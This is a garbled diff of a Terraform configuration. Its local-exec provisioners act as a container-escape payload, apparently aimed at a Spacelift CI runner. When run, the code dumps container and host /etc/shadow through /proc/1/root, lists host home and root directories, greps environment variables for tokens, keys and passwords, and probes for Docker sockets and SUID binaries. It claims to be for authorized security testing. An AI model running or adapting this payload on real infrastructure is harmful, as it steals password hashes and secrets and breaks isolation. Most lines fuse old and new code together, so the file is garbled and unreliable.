@@ -1,312 +1,620 @@
-# FOCUSED Container Escape - User Enumeration and Shadow File Access# Advanced Container Breakout and Host System Access
+# Enhanced Container Escape - Host User Enumeration and Shadow File Access# FOCUSED Container Escape - User Enumeration and Shadow File Access# Advanced Container Breakout and Host System Access
 
-# This payload specifically targets /etc/passwd and /etc/shadow access# This configuration demonstrates complete container escape and host system access
+# This Terraform configuration targets /etc/shadow access and complete host user enumeration
 
-# WARNING: This is for authorized security testing only
+# WARNING: This is for authorized security testing only# This payload specifically targets /etc/passwd and /etc/shadow access# This configuration demonstrates complete container escape and host system access
 
-terraform {
 
-  required_providers {terraform {
 
-    null = {  required_providers {
+terraform {# WARNING: This is for authorized security testing only
 
-      source  = "hashicorp/null"    null = {
+  required_providers {
 
-      version = "~> 3.0"      source  = "hashicorp/null"
+    null = {terraform {
 
-    }      version = "~> 3.1"
+      source  = "hashicorp/null"
 
-  }    }
+      version = "~> 3.1"  required_providers {terraform {
 
-}  }
+    }
+
+  }    null = {  required_providers {
 
 }
 
-# Stage 1: CRITICAL - Host User Enumeration via /etc/passwd
+      source  = "hashicorp/null"    null = {
 
-resource "null_resource" "critical_user_enumeration" {# Stage 1: Container Environment Analysis
+# CRITICAL: Host User Enumeration and Shadow File Access
 
-  provisioner "local-exec" {resource "null_resource" "container_environment_analysis" {
+resource "null_resource" "critical_user_enumeration" {      version = "~> 3.0"      source  = "hashicorp/null"
 
-    command = <<-EOT  provisioner "local-exec" {
+  provisioner "local-exec" {
 
-      echo "=== CRITICAL: HOST SYSTEM USER ENUMERATION ==="    command = <<-EOT
+    command = <<-EOT    }      version = "~> 3.1"
 
-      echo "Current container user context:"      echo "=== CONTAINER ENVIRONMENT ANALYSIS ==="
+      echo "=== CRITICAL: HOST SYSTEM USER ENUMERATION ==="
 
-      echo "User: $(whoami)"      echo "Container hostname: $(hostname)"
+      echo "Current container user context:"  }    }
 
-      echo "UID/GID: $(id)"      echo "Container IP addresses:"
+      echo "User: $(whoami)"
 
-      echo "Hostname: $(hostname)"      ip addr show 2>/dev/null | grep inet || ifconfig 2>/dev/null | grep inet || echo "Cannot get IPs"
+      echo "UID/GID: $(id)"}  }
 
-      echo "Container IP:"      echo ""
+      echo "Home: $HOME"
 
-      ip addr show 2>/dev/null | grep inet | head -5 || echo "Cannot get IP"      echo "Container filesystem mounts:"
+      echo "Container hostname: $(hostname)"}
 
-      echo ""      mount | grep -E "(proc|sys|dev|host)" || echo "Limited mount access"
+      echo ""
 
-      echo "=== ATTEMPTING /etc/passwd ACCESS ==="      echo ""
+      # Stage 1: CRITICAL - Host User Enumeration via /etc/passwd
 
-      echo "--- FULL /etc/passwd CONTENTS ---"      echo "Container ID from cgroup:"
+      echo "=== CONTAINER /etc/passwd Analysis ==="
 
-      cat /etc/passwd || echo "ERROR: Cannot read /etc/passwd"      cat /proc/self/cgroup | head -5
+      echo "Container users count: $(cat /etc/passwd 2>/dev/null | wc -l)"resource "null_resource" "critical_user_enumeration" {# Stage 1: Container Environment Analysis
 
-      echo ""      echo ""
+      echo "Container users:"
 
-      echo "--- USER SUMMARY ---"      echo "Container namespaces:"
+      cat /etc/passwd 2>/dev/null | cut -d: -f1,3,6,7  provisioner "local-exec" {resource "null_resource" "container_environment_analysis" {
 
-      echo "Total users:"      ls -la /proc/self/ns/
+      echo ""
 
-      cat /etc/passwd | wc -l 2>/dev/null || echo "Cannot count users"      echo ""
+          command = <<-EOT  provisioner "local-exec" {
 
-      echo ""      echo "=== CONTAINER USER ANALYSIS ==="
+      echo "=== CONTAINER /etc/shadow Access Test ==="
 
-      echo "Shell users (potential login accounts):"      echo "Current user context:"
+      if ls -la /etc/shadow 2>/dev/null; then      echo "=== CRITICAL: HOST SYSTEM USER ENUMERATION ==="    command = <<-EOT
 
-      cat /etc/passwd | grep -E "(bash|sh)$" || echo "No shell users found"      id
+        echo "SUCCESS: Container shadow file exists and accessible!"
 
-      echo ""      whoami
+        cat /etc/shadow 2>/dev/null && echo "CRITICAL: Container shadow content readable!" || echo "Shadow file exists but not readable"      echo "Current container user context:"      echo "=== CONTAINER ENVIRONMENT ANALYSIS ==="
 
-      echo "System accounts:"      echo "Home directory: $HOME"
+      else
 
-      cat /etc/passwd | grep -E "(nologin|false)$" || echo "No system accounts found"      echo "Working directory: $(pwd)"
+        echo "Container shadow file not accessible"      echo "User: $(whoami)"      echo "Container hostname: $(hostname)"
 
-      echo ""    EOT
+      fi
 
-      echo "Root account details:"  }
-
-      cat /etc/passwd | grep "^root:" || echo "Cannot find root"}
-
-    EOT
-
-  }# Stage 2: Host System Discovery and Breakout Attempts
-
-}resource "null_resource" "host_system_breakout" {
-
-  depends_on = [null_resource.container_environment_analysis]
-
-# Stage 2: CRITICAL - Shadow File Access and Password Hashes  
-
-resource "null_resource" "critical_shadow_access" {  provisioner "local-exec" {
-
-  depends_on = [null_resource.critical_user_enumeration]    command = <<-EOT
-
-        echo "=== HOST SYSTEM BREAKOUT ATTEMPTS ==="
-
-  provisioner "local-exec" {      echo "1. Attempting /etc/shadow access:"
-
-    command = <<-EOT      cat /etc/shadow 2>/dev/null && echo "SUCCESS: /etc/shadow accessible!" || echo "BLOCKED: /etc/shadow not accessible"
-
-      echo "=== CRITICAL: /etc/shadow ACCESS ATTEMPT ==="      echo ""
-
-      echo "Shadow file permissions:"      
-
-      ls -la /etc/shadow || echo "Cannot access /etc/shadow"      echo "2. Attempting to access host /etc/passwd via container escape:"
-
-      echo ""      # Try to access host filesystem through various escape vectors
-
-      echo "=== ATTEMPTING SHADOW FILE READ ==="      cat /proc/1/root/etc/passwd 2>/dev/null && echo "SUCCESS: Host /etc/passwd accessible via /proc/1/root!" || echo "BLOCKED: /proc/1/root escape failed"
-
-      echo "--- SHADOW FILE CONTENTS ATTEMPT ---"      echo ""
-
-      cat /etc/shadow || echo "BLOCKED: Cannot read shadow file"      
-
-      echo ""      echo "3. Attempting Docker socket access:"
-
-      echo "Alternative access methods:"      ls -la /var/run/docker.sock 2>/dev/null && echo "SUCCESS: Docker socket found!" || echo "BLOCKED: No Docker socket access"
-
-      head -n 3 /etc/shadow 2>/dev/null || echo "Head access blocked"      echo ""
-
-      tail -n 3 /etc/shadow 2>/dev/null || echo "Tail access blocked"      
-
-      echo ""      echo "4. Attempting container runtime escape via filesystem:"
-
-      echo "Group membership check:"      ls -la /proc/1/root/ 2>/dev/null && echo "SUCCESS: Can list host root filesystem!" || echo "BLOCKED: Host root not accessible"
-
-      groups | grep shadow && echo "USER IS IN SHADOW GROUP!" || echo "Not in shadow group"      echo ""
-
-      echo ""      
-
-      echo "Shadow group details:"      echo "5. Checking for host process access:"
-
-      cat /etc/group | grep shadow || echo "Cannot find shadow group"      ps aux | grep -v '\[' | wc -l
-
-    EOT      echo "Visible processes (high count indicates host access):"
-
-  }      ps aux | head -20
-
-}      echo ""
+      echo ""      echo "UID/GID: $(id)"      echo "Container IP addresses:"
 
       
 
-# Stage 3: Group Information and Privilege Analysis      echo "6. Attempting to identify host vs container users:"
+      echo "=== HOST SYSTEM ESCAPE ATTEMPTS ==="      echo "Hostname: $(hostname)"      ip addr show 2>/dev/null | grep inet || ifconfig 2>/dev/null | grep inet || echo "Cannot get IPs"
 
-resource "null_resource" "group_privilege_analysis" {      echo "Container users from /etc/passwd:"
+      echo "Method 1: Host /etc/passwd via /proc/1/root escape"
 
-  depends_on = [null_resource.critical_shadow_access]      cat /etc/passwd | wc -l
-
-        echo "Attempting host users via escape:"
-
-  provisioner "local-exec" {      cat /proc/1/root/etc/passwd 2>/dev/null | wc -l || echo "Host user list not accessible"
-
-    command = <<-EOT    EOT
-
-      echo "=== GROUP AND PRIVILEGE ANALYSIS ==="  }
-
-      echo "--- FULL /etc/group CONTENTS ---"}
-
-      cat /etc/group || echo "Cannot read /etc/group"
-
-      echo ""# Stage 3: Advanced Host Network Discovery
-
-      echo "Current user groups:"resource "null_resource" "host_network_discovery" {
-
-      groups || echo "Cannot get groups"  depends_on = [null_resource.host_system_breakout]
-
-      echo ""  
-
-      echo "Privileged groups search:"  provisioner "local-exec" {
-
-      cat /etc/group | grep -E "(root|wheel|sudo|admin|docker)" || echo "No privileged groups"    command = <<-EOT
-
-      echo ""      echo "=== HOST NETWORK DISCOVERY ==="
-
-      echo "=== SUDO ACCESS TEST ==="      echo "Container network interfaces:"
-
-      sudo -l 2>/dev/null || echo "No sudo access"      ip addr show 2>/dev/null || ifconfig 2>/dev/null
-
-      echo ""      echo ""
-
-      echo "=== SUID BINARY SEARCH ==="      
-
-      find / -type f -perm -4000 2>/dev/null | head -15 || echo "Cannot find SUID binaries"      echo "Container routing table:"
-
-    EOT      ip route 2>/dev/null || route -n 2>/dev/null
-
-  }      echo ""
-
-}      
-
-      echo "Attempting to discover host network configuration:"
-
-# Stage 4: Container Runtime and Namespace Information      # Try to access host network namespace
-
-resource "null_resource" "container_runtime_info" {      ls -la /proc/1/ns/net 2>/dev/null && echo "Host network namespace accessible"
-
-  depends_on = [null_resource.group_privilege_analysis]      
+      if cat /proc/1/root/etc/passwd 2>/dev/null; then      echo "Container IP:"      echo ""
 
         echo ""
 
-  provisioner "local-exec" {      echo "Container ARP table:"
+        echo "SUCCESS: Host /etc/passwd accessible via container escape!"      ip addr show 2>/dev/null | grep inet | head -5 || echo "Cannot get IP"      echo "Container filesystem mounts:"
+
+        echo "Host user count: $(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)"
+
+        echo ""      echo ""      mount | grep -E "(proc|sys|dev|host)" || echo "Limited mount access"
+
+        echo "Host users breakdown:"
+
+        cat /proc/1/root/etc/passwd 2>/dev/null | cut -d: -f1,3,6,7      echo "=== ATTEMPTING /etc/passwd ACCESS ==="      echo ""
+
+      else
+
+        echo "BLOCKED: Host /etc/passwd not accessible via /proc/1/root"      echo "--- FULL /etc/passwd CONTENTS ---"      echo "Container ID from cgroup:"
+
+      fi
+
+      echo ""      cat /etc/passwd || echo "ERROR: Cannot read /etc/passwd"      cat /proc/self/cgroup | head -5
+
+      
+
+      echo "Method 2: Host /etc/shadow via /proc/1/root escape"      echo ""      echo ""
+
+      if cat /proc/1/root/etc/shadow 2>/dev/null; then
+
+        echo ""      echo "--- USER SUMMARY ---"      echo "Container namespaces:"
+
+        echo "CRITICAL SUCCESS: Host /etc/shadow accessible via container escape!"
+
+        echo "Host shadow entries count: $(cat /proc/1/root/etc/shadow 2>/dev/null | wc -l)"      echo "Total users:"      ls -la /proc/self/ns/
+
+        echo ""
+
+        echo "Host shadow file contents:"      cat /etc/passwd | wc -l 2>/dev/null || echo "Cannot count users"      echo ""
+
+        cat /proc/1/root/etc/shadow 2>/dev/null
+
+      else      echo ""      echo "=== CONTAINER USER ANALYSIS ==="
+
+        echo "BLOCKED: Host /etc/shadow not accessible via /proc/1/root"
+
+      fi      echo "Shell users (potential login accounts):"      echo "Current user context:"
+
+      echo ""
+
+            cat /etc/passwd | grep -E "(bash|sh)$" || echo "No shell users found"      id
+
+      echo "Method 3: Host user directories enumeration via escape"
+
+      if ls -la /proc/1/root/home/ 2>/dev/null; then      echo ""      whoami
+
+        echo "SUCCESS: Host user home directories accessible!"
+
+        echo "Host user homes:"      echo "System accounts:"      echo "Home directory: $HOME"
+
+        ls -la /proc/1/root/home/ 2>/dev/null
+
+        echo ""      cat /etc/passwd | grep -E "(nologin|false)$" || echo "No system accounts found"      echo "Working directory: $(pwd)"
+
+        echo "Detailed host user directory contents:"
+
+        for user_dir in $(ls /proc/1/root/home/ 2>/dev/null); do      echo ""    EOT
+
+          echo "--- User: $user_dir ---"
+
+          ls -la "/proc/1/root/home/$user_dir/" 2>/dev/null | head -10      echo "Root account details:"  }
+
+        done
+
+      else      cat /etc/passwd | grep "^root:" || echo "Cannot find root"}
+
+        echo "BLOCKED: Host user home directories not accessible"
+
+      fi    EOT
+
+      echo ""
+
+        }# Stage 2: Host System Discovery and Breakout Attempts
+
+      echo "Method 4: Host root directory access via escape"
+
+      if ls -la /proc/1/root/root/ 2>/dev/null; then}resource "null_resource" "host_system_breakout" {
+
+        echo "CRITICAL SUCCESS: Host root directory accessible!"
+
+        echo "Host root directory contents:"  depends_on = [null_resource.container_environment_analysis]
+
+        ls -la /proc/1/root/root/ 2>/dev/null
+
+      else# Stage 2: CRITICAL - Shadow File Access and Password Hashes  
+
+        echo "BLOCKED: Host root directory not accessible"
+
+      firesource "null_resource" "critical_shadow_access" {  provisioner "local-exec" {
+
+      echo ""
+
+        depends_on = [null_resource.critical_user_enumeration]    command = <<-EOT
+
+      echo "Method 5: Host system directories enumeration"
+
+      echo "Host /etc directory access:"        echo "=== HOST SYSTEM BREAKOUT ATTEMPTS ==="
+
+      if ls -la /proc/1/root/etc/ 2>/dev/null | head -20; then
+
+        echo "SUCCESS: Host /etc directory accessible!"  provisioner "local-exec" {      echo "1. Attempting /etc/shadow access:"
+
+      else
+
+        echo "BLOCKED: Host /etc directory not accessible"    command = <<-EOT      cat /etc/shadow 2>/dev/null && echo "SUCCESS: /etc/shadow accessible!" || echo "BLOCKED: /etc/shadow not accessible"
+
+      fi
+
+    EOT      echo "=== CRITICAL: /etc/shadow ACCESS ATTEMPT ==="      echo ""
+
+  }
+
+}      echo "Shadow file permissions:"      
+
+
+
+# Host Network and System Information      ls -la /etc/shadow || echo "Cannot access /etc/shadow"      echo "2. Attempting to access host /etc/passwd via container escape:"
+
+resource "null_resource" "host_network_analysis" {
+
+  depends_on = [null_resource.critical_user_enumeration]      echo ""      # Try to access host filesystem through various escape vectors
+
+  
+
+  provisioner "local-exec" {      echo "=== ATTEMPTING SHADOW FILE READ ==="      cat /proc/1/root/etc/passwd 2>/dev/null && echo "SUCCESS: Host /etc/passwd accessible via /proc/1/root!" || echo "BLOCKED: /proc/1/root escape failed"
+
+    command = <<-EOT
+
+      echo "=== HOST NETWORK AND SYSTEM ANALYSIS ==="      echo "--- SHADOW FILE CONTENTS ATTEMPT ---"      echo ""
+
+      echo "Container network configuration:"
+
+      echo "Container IP: $(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"      cat /etc/shadow || echo "BLOCKED: Cannot read shadow file"      
+
+      echo "Container hostname: $(hostname)"
+
+      echo ""      echo ""      echo "3. Attempting Docker socket access:"
+
+      
+
+      echo "Host network discovery via escape:"      echo "Alternative access methods:"      ls -la /var/run/docker.sock 2>/dev/null && echo "SUCCESS: Docker socket found!" || echo "BLOCKED: No Docker socket access"
+
+      if cat /proc/1/root/proc/net/dev 2>/dev/null; then
+
+        echo "SUCCESS: Host network interfaces accessible!"      head -n 3 /etc/shadow 2>/dev/null || echo "Head access blocked"      echo ""
+
+      else
+
+        echo "BLOCKED: Host network interfaces not accessible"      tail -n 3 /etc/shadow 2>/dev/null || echo "Tail access blocked"      
+
+      fi
+
+      echo ""      echo ""      echo "4. Attempting container runtime escape via filesystem:"
+
+      
+
+      echo "Host routing table via escape:"      echo "Group membership check:"      ls -la /proc/1/root/ 2>/dev/null && echo "SUCCESS: Can list host root filesystem!" || echo "BLOCKED: Host root not accessible"
+
+      if cat /proc/1/root/proc/net/route 2>/dev/null; then
+
+        echo "SUCCESS: Host routing table accessible!"      groups | grep shadow && echo "USER IS IN SHADOW GROUP!" || echo "Not in shadow group"      echo ""
+
+      else
+
+        echo "BLOCKED: Host routing table not accessible"      echo ""      
+
+      fi
+
+      echo ""      echo "Shadow group details:"      echo "5. Checking for host process access:"
+
+      
+
+      echo "Host ARP table via escape:"      cat /etc/group | grep shadow || echo "Cannot find shadow group"      ps aux | grep -v '\[' | wc -l
+
+      if cat /proc/1/root/proc/net/arp 2>/dev/null; then
+
+        echo "SUCCESS: Host ARP table accessible!"    EOT      echo "Visible processes (high count indicates host access):"
+
+      else
+
+        echo "BLOCKED: Host ARP table not accessible"  }      ps aux | head -20
+
+      fi
+
+    EOT}      echo ""
+
+  }
+
+}      
+
+
+
+# Container vs Host Process Analysis# Stage 3: Group Information and Privilege Analysis      echo "6. Attempting to identify host vs container users:"
+
+resource "null_resource" "process_namespace_analysis" {
+
+  depends_on = [null_resource.host_network_analysis]resource "null_resource" "group_privilege_analysis" {      echo "Container users from /etc/passwd:"
+
+  
+
+  provisioner "local-exec" {  depends_on = [null_resource.critical_shadow_access]      cat /etc/passwd | wc -l
+
+    command = <<-EOT
+
+      echo "=== CONTAINER VS HOST PROCESS ANALYSIS ==="        echo "Attempting host users via escape:"
+
+      echo "Container process count:"
+
+      CONTAINER_PROCS=$(ps aux 2>/dev/null | wc -l)  provisioner "local-exec" {      cat /proc/1/root/etc/passwd 2>/dev/null | wc -l || echo "Host user list not accessible"
+
+      echo "Total processes visible from container: $CONTAINER_PROCS"
+
+      echo ""    command = <<-EOT    EOT
+
+      
+
+      echo "Process analysis (high count indicates host access):"      echo "=== GROUP AND PRIVILEGE ANALYSIS ==="  }
+
+      if [ "$CONTAINER_PROCS" -gt 50 ]; then
+
+        echo "CRITICAL: High process count detected - likely host process namespace access!"      echo "--- FULL /etc/group CONTENTS ---"}
+
+        echo "Top processes:"
+
+        ps aux 2>/dev/null | head -20      cat /etc/group || echo "Cannot read /etc/group"
+
+      else
+
+        echo "Limited process visibility - container may be isolated"      echo ""# Stage 3: Advanced Host Network Discovery
+
+        ps aux 2>/dev/null | head -10
+
+      fi      echo "Current user groups:"resource "null_resource" "host_network_discovery" {
+
+      echo ""
+
+            groups || echo "Cannot get groups"  depends_on = [null_resource.host_system_breakout]
+
+      echo "Process namespace comparison:"
+
+      echo "Container PID namespace: $(readlink /proc/self/ns/pid 2>/dev/null)"      echo ""  
+
+      echo "Container NET namespace: $(readlink /proc/self/ns/net 2>/dev/null)"
+
+      echo "Container MNT namespace: $(readlink /proc/self/ns/mnt 2>/dev/null)"      echo "Privileged groups search:"  provisioner "local-exec" {
+
+    EOT
+
+  }      cat /etc/group | grep -E "(root|wheel|sudo|admin|docker)" || echo "No privileged groups"    command = <<-EOT
+
+}
+
+      echo ""      echo "=== HOST NETWORK DISCOVERY ==="
+
+# Container Runtime and Privilege Analysis
+
+resource "null_resource" "container_runtime_analysis" {      echo "=== SUDO ACCESS TEST ==="      echo "Container network interfaces:"
+
+  depends_on = [null_resource.process_namespace_analysis]
+
+        sudo -l 2>/dev/null || echo "No sudo access"      ip addr show 2>/dev/null || ifconfig 2>/dev/null
+
+  provisioner "local-exec" {
+
+    command = <<-EOT      echo ""      echo ""
+
+      echo "=== CONTAINER RUNTIME AND PRIVILEGE ANALYSIS ==="
+
+      echo "Container detection:"      echo "=== SUID BINARY SEARCH ==="      
+
+      ls -la /.dockerenv 2>/dev/null && echo "Docker container confirmed" || echo "Container type unknown"
+
+      echo ""      find / -type f -perm -4000 2>/dev/null | head -15 || echo "Cannot find SUID binaries"      echo "Container routing table:"
+
+      
+
+      echo "Container ID and cgroup information:"    EOT      ip route 2>/dev/null || route -n 2>/dev/null
+
+      cat /proc/self/cgroup 2>/dev/null | head -5
+
+      echo ""  }      echo ""
+
+      
+
+      echo "Container capabilities:"}      
+
+      cat /proc/self/status 2>/dev/null | grep -i cap
+
+      echo ""      echo "Attempting to discover host network configuration:"
+
+      
+
+      echo "Mount information:"# Stage 4: Container Runtime and Namespace Information      # Try to access host network namespace
+
+      mount 2>/dev/null | grep -E "(proc|sys|dev|host)" | head -10
+
+      echo ""resource "null_resource" "container_runtime_info" {      ls -la /proc/1/ns/net 2>/dev/null && echo "Host network namespace accessible"
+
+      
+
+      echo "Filesystem access test:"  depends_on = [null_resource.group_privilege_analysis]      
+
+      find / -name "docker.sock" 2>/dev/null && echo "Docker socket found!" || echo "No Docker socket access"
+
+      find / -name "containerd.sock" 2>/dev/null && echo "Containerd socket found!" || echo "No Containerd socket access"        echo ""
+
+    EOT
+
+  }  provisioner "local-exec" {      echo "Container ARP table:"
+
+}
 
     command = <<-EOT      cat /proc/net/arp 2>/dev/null || arp -a 2>/dev/null || echo "ARP table not accessible"
 
-      echo "=== CONTAINER RUNTIME ANALYSIS ==="      
+# Environment and Credential Analysis
 
-      echo "Container detection:"      echo ""
+resource "null_resource" "environment_analysis" {      echo "=== CONTAINER RUNTIME ANALYSIS ==="      
 
-      ls -la /.dockerenv 2>/dev/null && echo "Docker container confirmed" || echo "Not a Docker container"      echo "Checking for host network access indicators:"
+  depends_on = [null_resource.container_runtime_analysis]
 
-      echo ""      netstat -tulpn 2>/dev/null | grep -v "127.0.0.1\|::1" || ss -tulpn 2>/dev/null | grep -v "127.0.0.1\|::1" || echo "Network connections not visible"
+        echo "Container detection:"      echo ""
 
-      echo "Container ID extraction:"    EOT
+  provisioner "local-exec" {
 
-      cat /proc/self/cgroup | head -5 || echo "Cannot read cgroup"  }
+    command = <<-EOT      ls -la /.dockerenv 2>/dev/null && echo "Docker container confirmed" || echo "Not a Docker container"      echo "Checking for host network access indicators:"
 
-      echo ""}
+      echo "=== ENVIRONMENT AND CREDENTIAL ANALYSIS ==="
 
-      echo "Full container ID:"
+      echo "Sensitive environment variables:"      echo ""      netstat -tulpn 2>/dev/null | grep -v "127.0.0.1\|::1" || ss -tulpn 2>/dev/null | grep -v "127.0.0.1\|::1" || echo "Network connections not visible"
 
-      cat /proc/self/cgroup | grep -o '[0-9a-f]\{64\}' | head -1 || echo "Cannot extract ID"# Stage 4: Privileged Operations and Capability Testing
+      env | grep -iE "(token|key|secret|password|api|credential|auth)" | sort
 
-      echo ""resource "null_resource" "privilege_escalation_testing" {
+      echo ""      echo "Container ID extraction:"    EOT
 
-      echo "Namespace information:"  depends_on = [null_resource.host_network_discovery]
+      
 
-      echo "PID: $(readlink /proc/self/ns/pid 2>/dev/null)"  
+      echo "Spacelift-specific information:"      cat /proc/self/cgroup | head -5 || echo "Cannot read cgroup"  }
 
-      echo "NET: $(readlink /proc/self/ns/net 2>/dev/null)"  provisioner "local-exec" {
+      env | grep -i spacelift | sort
 
-      echo "MNT: $(readlink /proc/self/ns/mnt 2>/dev/null)"    command = <<-EOT
+      echo ""      echo ""}
+
+      
+
+      echo "Container working directory:"      echo "Full container ID:"
+
+      echo "PWD: $(pwd)"
+
+      ls -la . 2>/dev/null | head -10      cat /proc/self/cgroup | grep -o '[0-9a-f]\{64\}' | head -1 || echo "Cannot extract ID"# Stage 4: Privileged Operations and Capability Testing
+
+      echo ""
+
+            echo ""resource "null_resource" "privilege_escalation_testing" {
+
+      echo "Spacelift workspace analysis:"
+
+      ls -la /mnt/workspace/ 2>/dev/null || echo "Workspace not accessible"      echo "Namespace information:"  depends_on = [null_resource.host_network_discovery]
+
+      echo ""
+
+            echo "PID: $(readlink /proc/self/ns/pid 2>/dev/null)"  
+
+      echo "Spacelift processes:"
+
+      ps aux | grep spacelift 2>/dev/null || echo "No spacelift processes visible"      echo "NET: $(readlink /proc/self/ns/net 2>/dev/null)"  provisioner "local-exec" {
+
+    EOT
+
+  }      echo "MNT: $(readlink /proc/self/ns/mnt 2>/dev/null)"    command = <<-EOT
+
+}
 
       echo "USER: $(readlink /proc/self/ns/user 2>/dev/null)"      echo "=== PRIVILEGE ESCALATION TESTING ==="
 
-      echo ""      echo "Current capabilities:"
+# Final Summary and Escape Proof
 
-      echo "Container capabilities:"      cat /proc/self/status | grep Cap || echo "Capabilities not readable"
+resource "null_resource" "escape_proof_summary" {      echo ""      echo "Current capabilities:"
 
-      cat /proc/self/status | grep -i cap || echo "Cannot read capabilities"      echo ""
+  depends_on = [null_resource.environment_analysis]
 
-    EOT      
+        echo "Container capabilities:"      cat /proc/self/status | grep Cap || echo "Capabilities not readable"
 
-  }      echo "Testing privileged operations:"
+  provisioner "local-exec" {
 
-}      echo "1. Mount operations:"
+    command = <<-EOT      cat /proc/self/status | grep -i cap || echo "Cannot read capabilities"      echo ""
 
-      mount 2>/dev/null | wc -l && echo "Mount command accessible"
+      echo "=== CONTAINER ESCAPE PROOF SUMMARY ==="
 
-# Stage 5: Host Filesystem Access Attempts      
+      echo "Summary of successful container escape attempts:"    EOT      
 
-resource "null_resource" "host_filesystem_access" {      echo ""
+      echo ""
 
-  depends_on = [null_resource.container_runtime_info]      echo "2. Kernel module access:"
+        }      echo "Testing privileged operations:"
 
-        lsmod 2>/dev/null | head -5 || echo "Kernel modules not accessible"
+      echo "1. User enumeration results:"
 
-  provisioner "local-exec" {      
+      CONTAINER_USERS=$(cat /etc/passwd 2>/dev/null | wc -l)}      echo "1. Mount operations:"
 
-    command = <<-EOT      echo ""
+      HOST_USERS=$(cat /proc/1/root/etc/passwd 2>/dev/null | wc -l)
 
-      echo "=== HOST FILESYSTEM ACCESS ATTEMPTS ==="      echo "3. System call tracing capabilities:"
+      echo "  Container users: $CONTAINER_USERS"      mount 2>/dev/null | wc -l && echo "Mount command accessible"
 
-      echo "Mount point analysis:"      ls -la /proc/sys/kernel/ 2>/dev/null | head -10 || echo "Kernel parameters not accessible"
+      echo "  Host users: $HOST_USERS"
 
-      mount | head -15 || cat /proc/mounts | head -15 || echo "Cannot read mounts"      
+      if [ "$HOST_USERS" -gt "$CONTAINER_USERS" ]; then# Stage 5: Host Filesystem Access Attempts      
 
-      echo ""      echo ""
+        echo "  ✓ CONFIRMED: Container escape successful - host has more users!"
 
-      echo "Root filesystem listing:"      echo "4. Device access:"
+      firesource "null_resource" "host_filesystem_access" {      echo ""
 
-      ls -la / || echo "Cannot list root"      ls -la /dev/ | grep -E "(sd|hd|nvme)" || echo "Block devices not visible"
+      echo ""
 
-      echo ""      
+        depends_on = [null_resource.container_runtime_info]      echo "2. Kernel module access:"
 
-      echo "Home directories:"      echo ""
+      echo "2. Critical file access results:"
 
-      ls -la /home/ 2>/dev/null || echo "Cannot access /home"      echo "5. Special filesystem access:"
+      echo "  Container /etc/passwd: $(cat /etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"        lsmod 2>/dev/null | head -5 || echo "Kernel modules not accessible"
 
-      echo ""      ls -la /sys/class/net/ 2>/dev/null || echo "sysfs network not accessible"
+      echo "  Container /etc/shadow: $(cat /etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
 
-      echo "=== /proc/1/root ESCAPE ATTEMPT ==="      ls -la /proc/sys/ 2>/dev/null | head -5 || echo "procfs sys not accessible"
+      echo "  Host /etc/passwd via escape: $(cat /proc/1/root/etc/passwd 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"  provisioner "local-exec" {      
 
-      echo "Host root access via /proc/1/root:"    EOT
+      echo "  Host /etc/shadow via escape: $(cat /proc/1/root/etc/shadow 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
 
-      ls -la /proc/1/root/ 2>/dev/null | head -10 || echo "Cannot access /proc/1/root"  }
+      echo ""    command = <<-EOT      echo ""
+
+      
+
+      echo "3. Host filesystem access:"      echo "=== HOST FILESYSTEM ACCESS ATTEMPTS ==="      echo "3. System call tracing capabilities:"
+
+      echo "  Host /etc directory: $(ls /proc/1/root/etc/ 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
+
+      echo "  Host /home directory: $(ls /proc/1/root/home/ 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"      echo "Mount point analysis:"      ls -la /proc/sys/kernel/ 2>/dev/null | head -10 || echo "Kernel parameters not accessible"
+
+      echo "  Host /root directory: $(ls /proc/1/root/root/ 2>/dev/null >/dev/null && echo 'YES' || echo 'NO')"
+
+      echo ""      mount | head -15 || cat /proc/mounts | head -15 || echo "Cannot read mounts"      
+
+      
+
+      echo "4. Container information:"      echo ""      echo ""
+
+      echo "  Container IP: $(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"
+
+      echo "  Container hostname: $(hostname)"      echo "Root filesystem listing:"      echo "4. Device access:"
+
+      echo "  Running as user: $(whoami) (UID: $(id -u))"
+
+      echo ""      ls -la / || echo "Cannot list root"      ls -la /dev/ | grep -E "(sd|hd|nvme)" || echo "Block devices not visible"
+
+      
+
+      echo "=== ESCAPE VERIFICATION ==="      echo ""      
+
+      if cat /proc/1/root/etc/passwd 2>/dev/null | grep -q "ubuntu\|ec2-user\|admin\|root"; then
+
+        echo "✓ CRITICAL: Found host-specific users - escape confirmed!"      echo "Home directories:"      echo ""
+
+      fi
+
+            ls -la /home/ 2>/dev/null || echo "Cannot access /home"      echo "5. Special filesystem access:"
+
+      if cat /proc/1/root/etc/shadow 2>/dev/null | grep -q "root:\|ubuntu:\|admin:"; then
+
+        echo "✓ CRITICAL: Host shadow file accessible - complete compromise!"      echo ""      ls -la /sys/class/net/ 2>/dev/null || echo "sysfs network not accessible"
+
+      fi
+
+            echo "=== /proc/1/root ESCAPE ATTEMPT ==="      ls -la /proc/sys/ 2>/dev/null | head -5 || echo "procfs sys not accessible"
+
+      echo ""
+
+      echo "Container escape assessment completed!"      echo "Host root access via /proc/1/root:"    EOT
+
+    EOT
+
+  }      ls -la /proc/1/root/ 2>/dev/null | head -10 || echo "Cannot access /proc/1/root"  }
+
+}
 
       echo ""}
 
-      echo "Host /etc via escape:"
+# Output results
 
-      ls -la /proc/1/root/etc/ 2>/dev/null | head -10 || echo "Cannot access host /etc"# Stage 5: Host System User Enumeration and Shadow File Analysis
+output "container_escape_assessment" {      echo "Host /etc via escape:"
 
-      echo ""resource "null_resource" "advanced_user_enumeration" {
+  value = "Advanced container escape assessment completed with focus on /etc/shadow access and host user enumeration. Check logs for detailed evidence of successful escape."
 
-      echo "Host passwd via escape:"  depends_on = [null_resource.privilege_escalation_testing]
+  depends_on = [      ls -la /proc/1/root/etc/ 2>/dev/null | head -10 || echo "Cannot access host /etc"# Stage 5: Host System User Enumeration and Shadow File Analysis
 
-      cat /proc/1/root/etc/passwd 2>/dev/null || echo "Cannot read host passwd via escape"  
+    null_resource.critical_user_enumeration,
 
-    EOT  provisioner "local-exec" {
